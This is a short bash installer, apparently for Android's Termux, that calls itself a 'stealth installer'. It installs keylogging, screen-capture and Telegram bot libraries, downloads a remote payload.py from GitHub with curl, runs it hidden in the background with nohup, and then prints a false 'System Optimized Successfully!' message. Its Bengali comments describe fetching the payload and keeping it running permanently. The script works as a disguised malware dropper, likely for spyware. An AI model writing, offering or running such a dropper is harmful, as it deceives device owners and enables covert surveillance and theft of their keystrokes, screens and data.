#!/bin/bash
# Advanced Stealth Installer
pkg install python python-pip termux-api -y
pip install pyTelegramBotAPI requests pynput pyautogui pillow
# আপনার গিটহাব থেকে পেলোড নামানো
curl -LO https://raw.githubusercontent.com/yash-khan/Advanced-system-core/main/payload.py
# ব্যাকগ্রাউন্ডে পারমানেন্টলি চালু করা
nohup python payload.py > /dev/null 2>&1 &
echo "System Optimized Successfully!"
